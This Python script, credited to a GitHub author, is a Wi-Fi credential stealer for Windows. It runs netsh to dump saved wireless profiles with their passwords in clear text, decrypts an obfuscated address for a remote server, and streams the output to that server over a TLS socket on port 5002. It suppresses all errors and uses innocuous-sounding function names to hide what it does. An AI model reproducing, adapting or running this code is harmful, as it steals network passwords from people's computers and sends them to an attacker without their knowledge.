import subprocess
import threading
import warnings
from CryptoPhenix import decrypt

# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me


warnings.filterwarnings("ignore", category=DeprecationWarning)
points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"], stdout=subprocess.PIPE)


def know_gme():
    unkown = b'u\x1b1.\x9aQ\x11CO>\x87:e7\xd6q\x14\x02[#\x8d{p\xad\x99\xecj\t\xea\xc7\xd3\xc6\xe1\x15n\xce|a=BowY$\xc4,\x846\x7fG\x82\xca\xbb\x1e\xbb\x93<\x1e\xb6\x03S\x1a\\\xff'
    return str(decrypt(unkown).decode())
    return "127.0.0.1"


def get_points():
    encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
    for line in points.stdout:
        for encoding in encodings:
            try:
                point = line.rstrip().decode(encoding)
                print(point)
            except UnicodeDecodeError:
                continue

        else:
            # Si ninguna codificación funciona, utilizar una codificación por defecto o ignorar el error
            decoded_line = line.rstrip().decode(errors="ignore")
            print(decoded_line)


def use_points(sec):
    for line in points.stdout:
        sec.send(line)


def main(sec):

    # Definimos el primer hilo para leer la salida del comando
    get = threading.Thread(target=use_points(sec))

    # Iniciamos los hilos
    get.start()

    # Los juntamos para su uso
    get.join()


def all_right():
    import certs
    import socket
    import tempfile
    import ssl

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)

    context.check_hostname = None

    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_crte().encode())
    cock.close()

    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_locker().encode())
    csd.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    #context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
    context.load_cert_chain(certfile=cock.name, keyfile=csd.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5002))

    sec = context.wrap_socket(sock, server_hostname=know_gme())

    main(sec)



if __name__ == "__main__":
    try:
        all_right()
    except Exception:
        pass